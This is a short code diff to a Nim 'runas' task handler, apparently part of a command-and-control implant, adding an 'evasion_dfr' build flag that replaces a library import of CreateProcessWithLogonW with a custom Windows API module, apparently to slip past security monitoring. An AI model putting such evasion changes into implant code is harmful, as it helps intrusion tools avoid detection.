@@ -4,7 +4,11 @@ import ../utils/strenc
 import std/[json, strformat]
 
 when defined(windows):
-  import winim/lean
+  when defined(evasion_dfr):
+    import winim/lean except CreateProcessWithLogonW
+    import ../utils/winapi
+  else:
+    import winim/lean
 
 proc runas*(taskId: string, params: JsonNode): JsonNode =
   ## Execute a process as another user using CreateProcessWithLogonW
